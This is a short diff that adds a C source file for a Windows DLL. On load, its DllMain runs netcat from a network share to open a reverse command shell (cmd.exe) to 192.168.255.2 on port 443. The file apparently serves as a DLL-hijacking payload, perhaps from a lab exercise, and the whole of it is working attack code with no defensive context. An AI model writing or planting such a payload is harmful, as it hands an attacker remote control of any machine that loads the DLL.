@@ -1,0 +1,14 @@
+#include <windows.h>
+
+BOOL __stdcall DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpvReserved) {
+
+    switch (dwReason) {
+
+    case DLL_PROCESS_ATTACH:
+        system("\\\\192.168.255.2\\share\\nc64.exe 192.168.255.2 443 -e cmd.exe");
+        break;
+    }
+
+    return TRUE;
+
+}
